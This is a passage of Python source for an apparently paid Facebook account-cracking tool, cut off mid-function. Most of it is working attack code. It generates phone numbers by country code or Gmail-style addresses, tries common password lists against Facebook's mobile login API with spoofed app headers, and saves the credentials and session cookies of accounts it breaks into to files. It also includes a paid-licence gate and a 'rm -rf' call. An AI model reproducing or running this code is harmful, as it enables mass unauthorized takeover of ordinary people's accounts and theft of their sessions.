	return re.sub(r'[^a-zA-Z0-9#]', '', text)

def process_completed():
	global oks, cps
	print('\033[1;37m')
	linex()
	print(' THE PROCESS HAS COMPLETED')
	print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
	linex()
	input(' PRESS ENTER TO BACK ')
	menu()

#-> Random UserAgents <-#
def random_ua():
	ua1 = f"Mozilla/5.0 (iPhone, CPU iPhone {str(random.randint(4,16))}_{str(random.randint(1,9))}_{str(random.randint(1,9))} like Mac OS {str(random.randint(8,16))}) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/{str(random.randint(9,19))}{random.choice(string.ascii_uppercase)}{str(random.randint(50,199))}) Safari/604.1"
	ua2 = f"Mozilla/5.0 (iPhone {str(random.randrange(4,6))} X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{str(random.randint(4,13))}.1.1 Mobile/iPhone{str(random.randint(4,16))},{str(random.randint(1,9))} Safari/604.1"
	ua3 = f"Mozilla/5.0 (Linux; Android {str(random.randint(4,13))}; {random.choice(['SM-S911B','SM-S908B','SM-G998B','SM-G988B','SM-G973B','SM-N986B'])}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36"
	ua4 = f"Mozilla/5.0 (Linux; Android {random.randrange(10,13)}; {random.choice(['RMX3686','RMX3393','RMX3081','RMX2170','RMX2061','RMX2020'])} Build/{random.choice(['QP1A','SKQ1','TP1A','RKQ1','SP1A','RP1A'])}.{random.randrange(100000,250000)}.00{random.randrange(1,10)}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randrange(112,115)}.0.{random.randrange(1000,10000)}.{random.randrange(10,100)} Mobile Safari/537.36"
	ua5 = f"Mozilla/5.0 (Linux; Android {random.randrange(10,13)}; {random.choice(['SM-S911B','SM-S908B','SM-G998B','SM-G988B','SM-G973B','SM-N986B'])} Build/{random.choice(['PPR1','LRX21T','TP1A','RKQ1','SP1A','RP1A'])}.{random.randrange(100000,250000)}.00{random.randrange(1,10)}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randrange(112,115)}.0.{random.randrange(1000,10000)}.{random.randrange(10,100)} Mobile Safari/537.36"
	ua6 = f"Mozilla/5.0 (Linux; Android {random.randrange(10,13)}; {random.choice(['vivo 1951','vivo 1918','V2011A','V2047','V2145','V2227A','V2160'])} Build/{random.choice(['RP1A','PKQ1','QP1A','TP1A'])}.{random.randrange(100000,250000)}.00{random.randrange(1,10)}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randrange(112,115)}.0.{random.randrange(1000,10000)}.{random.randrange(10,100)} Mobile Safari/537.36"
	return random.choice([ua1,ua2,ua3,ua4,ua5,ua6])
#-> farhan_request Function by Farhan Ali <-#
def farhan_request(url, method="GET", data=None, headers=None):
	c = pycurl.Curl()
	c.setopt(pycurl.URL, url)
	c.setopt(pycurl.ACCEPT_ENCODING, '')
	
	if method:
		c.setopt(pycurl.CUSTOMREQUEST, method)
	
	if headers:
		c.setopt(pycurl.HTTPHEADER, [f"{k}: {v}" for k, v in headers.items()])
	
	if method == "POST" and data:
		c.setopt(pycurl.POSTFIELDS, "&".join(f"{k}={v}" for k, v in data.items()))
	
	buffer = BytesIO()
	c.setopt(pycurl.WRITEDATA, buffer)
	c.perform()
	
	resp = buffer.getvalue().decode('utf-8')
	c.close()
	
	return resp

#-> Approval System by Siam Ahmed (Fixed by Farhan Ali)
def approval():
	clear()
	uuid = str(os.geteuid())+"#"+ platform.uname().machine+platform.uname().version+platform.uname().release
	id = cleanUid(uuid)
	k1, k2, k3, k4 = id[:4], id[3:6], id[4:9], id[9:]
	intuid = int(id.split("#")[0])
	pref = str((intuid - 104729) * 2-37 + (1-2 ** 7))
	suff = str((intuid - 523217) % 104729)
	realid = (suff + k3 + k1 + k4 + k2 + pref).encode().hex()
	
	try:
		server = KARAN_request('https://raw.githubusercontent.com/KARAN THANI/aproval/main/approval.txt', "GET")
		if realid in server:
			pass
		else:
			print("\33[1;32m YOUR KEY :\x1b[38;5;46m "+id)
			print(f'\33[1;37m{eqs()}')
			print(f"\33[1;37m{eqs()}")
			print("\33[1;36m NOTE:- THIS TOOL IS PAID \n YOU HAVE TO PAY FOR APPROVAL FIRST .")
			print(f'\33[1;37m{eqs()}')
			print("\33[37;41m\t WELCOME TO KARAN TOOLAND ENJOY \33[0;m")
			print(f'\33[1;37m{eqs()}')
			print("\33[1;37m SEND 500 PKR (FOR 15 DAYS APPROVEL)")
			print(f'\33[1;37m{eqs()}')
			print("\33[1;37m SEND 3 $ usd (FOR 15 DAYS APPROVEL)")
			print(f'\33[1;37m{eqs()}')
			print("\33[1;37m SEND 700 PKR (FOR 30 DAYS APPROVEL)")
			print(f'\33[1;37m{eqs()}')
			print("\33[1;37m SEND 5 $ usd (FOR 30 DAYS APPROVEL)")
			print(f'\33[1;37m{eqs()}')
			print("\33[1;37m ESEWA (9762434145")
			print("\33[1;37m KHALTI (9762434145)")
			print("\33[37;41m\t INSHALLAH DAILY LUSH UPDATES \33[0;m")
			input(' IF YOU ARE FREE USER THEN DONT PRESS ENTER')
			tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('xdg-open https://wa.me/message/923238272402'+tks)
			sys.exit()
	except:
		sys.exit()

#-> Menu <-#
def menu():
	global loop, oks, cps, oks, ok, cp, ok1, pcp
	loop=loop*0; oks.clear(); cps.clear(); ok=ok*0; cp=cp*0; ok1=ok1*0; pcp.clear()
	try:
		#approval()
		clear()
		print('[1] CRACK FILE')
		print('[2] AUTO CREATE ')
		print('[3] RANDOM CRACK')
		print('[4] CREATE FILE')
		print('[5] AUTO 2 FACTOR')
		print('[6] AUTO 2 FACTOR BULK FILE')
		print('[7] FOLLOW FB')
		print('[0] EXIT ')
		linex()
		xd = input(' CHOOSE AN OPTION: ')
		
		if xd in ['1','01']:
			clear()
			print(' PUT FILE EXAMPLE :	/sdcard/File.KARAN.etc..')
			linex()
			file = input(' PUT FILE PATH\033[1;37m: ')
			
			try:
				fo = open(file,'r').read().splitlines()
			except FileNotFoundError:
				print(' FILE NOT FOUND ')
				time.sleep(1)
				menu()
			
			clear()
			print('[1] METHOD NEW (1)')
			print('[2] METHOD OLD/NEW (2)')
			print('[3] METHOD OLD (3)')
			linex()
			mthd = input(' CHOOSE : ')
			linex()
			clear()
			plist = []
			
			try:
				ps_limit = int(input(' HOW MANY PASSWORDS DO YOU WANT TO ADD ? '))
			except:
				ps_limit = 1
			
			linex()
			clear()
			print('\033[1;32m EXAMPLE : first last,firtslast,first123')
			linex()
			for i in range(ps_limit):
				plist.append(input(f' PUT PASSWORD {i+1}: '))
			linex()
			clear()
			print(' DO YOU WANT SHOW COOKIES :? (Y/N): ')
			linex()
			cx = input(' CHOOSE : ')
			if cx in ['y','Y','yes','Yes','1']:
				pcp.append('y')
			else:
				pcp.append('n')
			
			with thread(max_workers=30) as crack_submit:
				clear()
				total_ids = str(len(fo))
				print(' TOTAL ACCOUNT : \033[1;32m'+total_ids+f' ')
				print("\033[1;37m CRACKING STARTED...\033[1;37m")
				linex()
				for user in fo:
					try:
						ids, names = user.split('|')
						passlist = plist
						if mthd in ['1','01']:
							crack_submit.submit(ffb,ids,names,passlist)
						elif mthd in ['2','02']:
							crack_submit.submit(api,ids,names,passlist)
						elif mthd in ['3','03']:
							crack_submit.submit(api1,ids,names,passlist)
					except:
						pass
			process_completed()
		elif xd in ['3','03']:
			clear()
			print(' [1] Pakistan cloning\n [2] Bangladesh cloning\n [3] Afghanistan cloning\n [4] India cloning\n [5] nepal cloning\n [6] Gmail cloning\n [0] Back menu')
			linex()
			x = input(' Choose: ')
			
			if x in ['1','01']:
				pak()
			elif x in ['2','02']:
				bd()
			elif x in ['3','03']:
				afg()
			elif x in ['4','04']:
				ind()		
			elif x in ['5','05']:	
				npl()
			elif x in ['6','06']:	
				gmail()		
			else:
				menu()
		elif xd in ['2','02']:
			Crreate()
		elif xd in ['4','04']:
			create()
		elif xd in ['5','05']:
			Auto2F()
		elif xd in ['6','06']:
			os.system('python 2F.py')
		elif xd in ['7','07']:
			os.system('xdg-open https://www.facebook.com/profile.php?id=100077405921067')
			menu()
		elif xd in ['0','00']:
			exit()
		else:
			print("Invalid Choice!")
			time.sleep(2)
			menu()
						
	except pycurl.error:
		print('\n NO INTERNET CONNECTION ...')
		exit()

#-> Pakistan Cloning <-#
def pak():
	user = []
	clear()
	print('\033[1;31m CODE EXAMPLE : 0306,0315,0335,0345')
	code = input('\033[1;37m PUT CODE: ')
	
	try:
		limit = int(input('\033[1;31m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
	except ValueError:
		limit = 5000
	
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	
	with thread(max_workers=30) as Thread:	 
		clear()
		tl = str(len(user))
		print('[+] Total accounts: \033[1;97m'+tl)
		print('[+] Select code: \033[1;97m '+code)
		print('[+] Process has been started \033[1;97m')
		linex()
		
		for psx in user:
			ids = code+psx
			passlist = [psx,ids,'khankhan','malik123','kingkhan','baloch123','pak123','khan123']
			Thread.submit(rndm,ids,passlist)
		
	process_completed()

#-> Bangladesh Cloning <-#
def bd():
	user = []
	clear()
	print('\033[1;31m CODE EXAMPLE : 017,016,018')
	code = input('\033[1;37m PUT CODE: ')
	
	try:
		limit = int(input('\033[1;31m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
	except ValueError:
		limit = 5000
	
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	
	with thread(max_workers=30) as Thread:	 
		clear()
		tl = str(len(user))
		print('[+] Total accounts: \033[1;97m'+tl)
		print('[+] Select code: \033[1;97m '+code)
		print('[+] Process has been started \033[1;97m')
		linex()
		for psx in user:
			ids = code+psx
			passlist = [psx,ids,'i love you','iloveyou','free fire','freefire','57273200']
			Thread.submit(rndm,ids,passlist)
			
	process_completed()

#-> Afghanistan Cloning <-#
def afg():
	user = []
	clear()
	print('\033[1;31m CODE EXAMPLE : 9377,9379,9374')
	code = input('\033[1;37m PUT CODE: ')
	
	try:
		limit = int(input('\033[1;31m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
	except ValueError:
		limit = 5000
	
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	
	with thread(max_workers=30) as Thread:	 
		clear()
		tl = str(len(user))
		print('[+] Total accounts: \033[1;97m'+tl)
		print('[+] Select code: \033[1;97m '+code)
		print('[+] Process has been started \033[1;97m')
		linex()
		for psx in user:
			ids = code+psx
			passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
			Thread.submit(rndm,ids,passlist)
		
	process_completed()

#-> India Cloning
def ind():
	user = []
	clear()
	print('\033[1;31m CODE EXAMPLE : 91***,etc')
	code = input('\033[1;37m PUT CODE: ')
	
	try:
		limit = int(input('\033[1;31m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
	except ValueError:
		limit = 5000
	
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	
	with thread(max_workers=30) as Thread:	 
		clear()
		tl = str(len(user))
		print('[+] Total accounts: \033[1;97m'+tl)
		print('[+] Select code: \033[1;97m '+code)
		print('[+] Process has been started \033[1;97m')
		linex()
		for psx in user:
			ids = code+psx
			passlist = [psx,ids,'57273200','hindustan','kingkhan','india123','59039200','57575751']
			Thread.submit(rndm,ids,passlist)
		
	process_completed()

#-> India Cloning
def npl():
	user = []
	clear()
	print('\033[1;31m CODE EXAMPLE : ***,etc')
	code = input('\033[1;37m PUT CODE: ')
	
	try:
		limit = int(input('\033[1;31m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
	except ValueError:
		limit = 5000
	
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	
	with thread(max_workers=30) as Thread:	 
		clear()
		tl = str(len(user))
		print('[+] Total accounts: \033[1;97m'+tl)
		print('[+] Select code: \033[1;97m '+code)
		print('[+] Process has been started \033[1;97m')
		linex()
		for psx in user:
			ids = code+psx
			passlist = [psx,ids,'57273200','nepal','nepalnepal','nepal123','nepal1122','57575751']
			Thread.submit(rndm,ids,passlist)
		
	process_completed()

#-> Gmail Cloning <-#
def gmail():
	os.system('rm -rf .re.txt')
	clear()
	print('\033[1;37m example: muhammad, ali, sajjad, faizan\033[1;97m')
	linex()
	first = input(' Put first name: ')
	linex()
	print('\033[1;37m example: khan, ahmad, ali \033[1;97m')
	linex()
	last = input(' Put last name: ')
	linex()
	print(' Example: @gmail.com , @yahoo.com etc...')
	linex()
	domain = input(' domain: ')
	linex()

	try:
		limit = int(input(' Put limit: '))
	except ValueError:
		limit = 5000
	
	linex()
	print(' Getting gmails...')
	for xd in range(limit):
		lchoice = random.choice(['3', '4'])
		if '3' in lchoice:
			mail = ''.join(random.choice(string.digits) for _ in range(3))
			open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
		else:
			mail = ''.join(random.choice(string.digits) for _ in range(4))
			open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
		
	fo = open('.re.txt', 'r').read().splitlines()
	with thread(max_workers=30) as Thread:
		total = str(len(fo))
		clear()
		print(' Total account : \033[1;32m'+total)
		print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
		linex()
		for user in fo:
			ids,names = user.split('|')
			first_name = names.rsplit(' ')[0]
		
			try:
				last_name = names.rsplit(' ')[1]
			except IndexError:
				last_name = 'Khan'
			
			fs = first_name.lower()
			ls = last_name.lower()
			passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
			Thread.submit(rndm,ids,passlist)
			
	process_completed()

#-> ffb Method <-#
def ffb(ids,names,passlist):
	global oks, loop, cps, twf
	try:
		sys.stdout.write('\r\r\033[1;37m [KARAN-RUNING-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		try:
			fn = names.split(' ')[0]
		except:
			fn = names
		try:
			ln = names.split(' ')[1]
		except:
			ln = fn
		
		for pw in passlist:
			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
			ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957652;FBDM+/{density=2.625,width=2434,height=1096};FBLC/it_IT;FBRV/334731776;FBCR/CTM;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/XQ-AT52;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]"+"[FBAN/FB4A;FBAV/198.0.0.53.101;FBBV/131501813;FBDM/{density=2. 0,width=720,height=1280};FBLC/en_US;FBRV/0;FB_FW/2;FBCR/Boost Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FB DV/SM-J337P;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/300.2.0.58.129;FBBV/265245028;FBDM/{density=3.0,width=1080,height=2090};FBLC/ru_RU;FBRV/268119191;FBCR/MTS RUS;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/JNY-LX1;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/332.0.0.23.111;FBBV/311606716;FBDM/{density=2.75,width=1080,height=2150};FBLC/ru_RU;FBRV/312870330;FBCR/MegaFon;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/MI PLAY;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/370.0.0.23.112;FBBV/374931231;FBDM/{density=1.3312501,width=1280,height=736};FBLC/en_US;FBRV/0;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T290;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"+"[FBAN/FB4A;FBAV/367.0.0.24.107;FBBV/370253085;FBDM/{density=3.0,width=1080,height=2168};FBLC/en_Qaau_GB;FBRV/0;FBCR/SGP-M1;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G781B;FBSV/11;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]"
			headers = {'User-Agent': ua,'Accept-Encoding': 'gzip, deflate','Connection': 'close','Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI':	str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI': str(random.randint(2e4, 4e4)),'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type': 'WIFI','X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True',	'X-FB-Server-Cluster': 'True','x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
			data = {'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'email': ids,'password': pas,'generate_analytics_claims': '1','community_id': '','cpl': 'true','try_num': '1','family_device_id': str(uuid.uuid4()),'credentials_type': 'password','source': 'login','error_detail_type': 'button_with_disabled','enroll_misauth': 'false','generate_session_cookies': '1','generate_machine_id': '1','currently_logged_in_userid': '0',	'locale': 'es_ES','client_country_code': 'ES','fb_api_req_friendly_name': 'authenticate','api_key': '62f8ce9f74b12f84c123cc23437a4a32','access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
			url = 'https://b-graph.facebook.com/auth/login'
						
			po = requests.post(url, data=data, headers=headers).text
			po = json.loads(po)
			if 'session_key' in po:
				oks.append(ids)
				print('\r\r\033[1;32m [LEGEND-KAAARN-OK] '+ids+' | '+pas+'\033[1;97m')
				coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				open('/sdcard/KARAN-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
				open('/sdcard/KARAN-OK.txt','a').write(ids+'|'+pas+'\n')
				break
			elif twf in po:
				if 'y' in pcp:
					cps.append(ids)
					break
			elif 'www.facebook.com' in po['error']['message']:
				if 'y' in pcp:
					cps.append(ids)
					open('/sdcard/KARAN-CP.txt','a').write(ids+'|'+pas+'\n')
					break
				else:
					cps.append(ids)
					open('/sdcard/KARAN-CP.txt','a').write(ids+'|'+pas+'\n')
					break
			else:
				continue
		loop += 1
	except requests.exceptions.ConnectionError:
		#print("\nInternet Connection Error\nSleeping for 60s")
		time.sleep(60)
	except Exception as e:
		#print(e)
		time.sleep(20)

#-> api Method <-#
def api(ids,names,passlist):
	global oks, loop, cps, twf
	sys.stdout.write('\r\r\033[1;37m [KARAN-RUNING-M2 ] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	try:
		try:
			fn = names.split(' ')[0]
		except:
			fn = names
		try:
			ln = names.split(' ')[1]
		except:
			ln = fn
		
		for pw in passlist:
			pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
			ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;FBAV/438.0.0.34.118;FBBV/529989542;FBDM/{density=3.375,width=1080,height=2172};FBLC/en_US;FBRV/0;FB_FW/2;FBCR/PalauCel;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A235F;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"
			data = {'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'email': ids,'password': pas,'generate_analytics_claims': '1','community_id': '','cpl': 'true','try_num': '1','family_device_id': str(uuid.uuid4()),'credentials_type': 'password','source': 'login','error_detail_type': 'button_with_disabled','enroll_misauth': 'false','generate_session_cookies': '1','generate_machine_id': '1','currently_logged_in_userid': '0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name': 'authenticate','api_key': '62f8ce9f74b12f84c123cc23437a4a32','access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
			headers = {'User-Agent': ua,'Accept-Encoding': 'gzip, deflate','Connection': 'Keep-Alive','Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
			url = 'https://b-graph.facebook.com/auth/login'
			po = requests.post(url, data=data, headers=headers).text
			po = json.loads(po)
			if 'session_key' in po:
				oks.append(ids)
				print('\r\r\033[1;32m [LEGEND-KARAN-OK] '+ids+' | '+pas+'\033[1;97m')
				coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				print("\r\r\033[1;33m Cookie: "+coki)
				open('/sdcard/KARAN-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
				open('/sdcard/KARAN-OK.txt','a').write(ids+'|'+pas+'\n')
				break
			elif twf in po:
				if 'y' in pcp:
					cps.append(ids)
					break
			elif 'www.facebook.com' in po['error']['message']:
				if 'y' in pcp:
					cps.append(ids)
					open('/sdcard/KARAN-CP.txt','a').write(ids+'|'+pas+'\n')
					break
				else:
					cps.append(ids)
					open('/sdcard/KARAN-CP.txt','a').write(ids+'|'+pas+'\n')
					break
			else:
				continue
		loop += 1
	except requests.exceptions.ConnectionError:
		#print("Internet Connection Error\nSleeping for 60s")
		time.sleep(60)
		#pass
	except Exception as e:
		#print(e)
		time.sleep(20)
		#pass

#-> api1 Method <-#
def api1(ids,names,passlist):
	global loop, oks, cps
	sys.stdout.write('\r\r\033[1;37m [KARAN-RUNING] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	
	try:
		for pas in passlist:
			ua = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,313)) +";FBBV/"+str(random.randint(11111111,77777777))+"Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G532G Build/MMB29T) [FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G532G;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]','[FBAN/FB4A;FBAV/320.0.0.34.118;FBBV/293906223;FBDM/{density=2.9125001,width=2560,height=1516};FBLC/ru_RU;FBRV/296240860;FBCR/;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/SCM-W09;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]','Dalvik/1.6.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/AndroidSampleApp;FBAV/148.0.051.62;FBLC/id_ID;FBBV/4084560;FBCR/Telkomsel;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.3312501,width=375,height=812};FB_FW/1;]','[FBAN/FB4A;FBAV/116.0.0.62.122;FBBV/187723456;FBLC/en_US;FBRV/279865282;FBCR/Nepal Telecom;FBMF/OPPO;FBBD/OPPO;FBNP/com.facebook.katana;FBDV/CPH1707;FBSV/10;FBOP/17;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1080,height=2034};]','[FBAN/FB4A;FBAV/279.0.0.41.119;FBBV/277444756;FBLC/en_US;FBRV/279865282;FBCR/Nepal Telecom;FBMF/TECNO;FBBD/TECNO;FBNP/com.facebook.katana;FBDV/TECNO CF7k;FBSV/12;FBOP/19;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};]"
			
			data = {'adid': ''.join(random.choices(string.hexdigits, k=16)),'format': 'json','device_id': str(uuid.uuid4()),'email': ids,'password': pas,'generate_analytics_claims': '1','credentials_type': 'password','source': 'login','error_detail_type': 'button_with_disabled','enroll_misauth': 'false','generate_session_cookies': '1','generate_machine_id': '1','fb_api_req_friendly_name': 'authenticate'}
			headers = {'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Friendly-Name': 'authenticate','X-FB-Connection-Type': 'unknown','User-Agent': ua,'Accept-Encoding': 'gzip, deflate','Content-Type': 'application/x-www-form-urlencoded','X-FB-HTTP-Engine': 'Liger'}
			url = 'https://b-graph.facebook.com/auth/login'
			
			po = requests.post(url, data=data, headers=headers).text
			po = json.loads(po)
			if 'session_key' in po:
				try:
					uid = po['uid']
				except:
					uid = ids
				if str(uid) in oks:
					break
				else:
					oks.append(str(uid))
					print('\r\r\033[1;32m [LEGEND-KARAN-OK] '+str(uid)+' | '+pas+'\033[1;97m')
					coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
					open('/sdcard/KARAN-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
					open('/sdcard/KARAN-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
					break
			elif 'www.facebook.com' in po['error']['message']:
				try:
					uid = po['error']['error_data']['uid']
				except:
					uid = ids
				
				if uid in oks:
					pass
				else:
					cps.append(str(ids))
					open('/sdcard/KARAN-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
					break
			else:
				continue
		loop += 1
	except requests.exceptions.ConnectionError:
		#print("Internet Connection Error\nSleeping for 60s")
		time.sleep(60)
		#pass
	except Exception as e:
		#print(e)
		time.sleep(20)
		#pass

#-> rndm Method <-#
def rndm(ids,passlist):
	global loop, oks, cps
	sys.stdout.write('\r\r\033[1;37m [KARAN-RUNING] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	
	try:
		for pas in passlist:
			ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/FB4A;"+"FBAV/340.0.0.27.113;"+"FBBV/324485356;"+"FBDM/){density=2.75,width=1080,height=2135};"+"FBLC/it_IT;"+"FBRV/0;"+"FBCR/MegaFon;"+"FBMF/Xiaomi;"+"FBBD/Xiaomi;"+"FBPN/com.facebook.katana;"+"FBDV/MI 9;"+"FBSV/10;"+"FBOP/1;"+"FBCA/arm64-v8a:;]"+"[FBAN/FB4A;"+"FBAV/345.0.0.34.118;"+"FBBV/332957718;"+"FBDM/+{density=2.0,width=720,height=1384};"+"FBLC/ru_RU;"+"FBRV/335140889;"+"FBCR/MTS RUS;"+"FBMF/samsung;"+"FBBD/samsung;"+"FBPN/com.facebook.katana;"+"FBDV/SM-A013F;"+"FBSV/10;"+"FBOP/1;"+"FBCA/armeabi-v7a:"+"armeabi;]"+"[FBAN/FB4A;"+"FBAV/320.0.0.34.118;"+"FBBV/293905889;"+"FBDM/+{density=3.0,width=1080,height=2107};"+"FBLC/fr_FR;"+"FBRV/295842623;"+"FBCR/Ooredoo TN;"+"FBMF/HUAWEI;"+"FBBD/HUAWEI;"+"FBPN/com.facebook.katana;"+"FBDV/MAR-LX1M;"+"FBSV/9;"+"FBOP/1;"+"FBCA/arm64-v8a:;]"
			data = {'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'email': ids,'password': pas,'generate_analytics_claims': '1','community_id': '','cpl': 'true','try_num': '1','family_device_id': str(uuid.uuid4()),'credentials_type': 'password','source': 'login','error_detail_type': 'button_with_disabled','enroll_misauth': 'false','generate_session_cookies': '1','generate_machine_id': '1','currently_logged_in_userid': '0','locale': 'en_US','client_country_code': 'US','fb_api_req_friendly_name': 'authenticate','api_key': '62f8ce9f74b12f84c123cc23437a4a32','access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
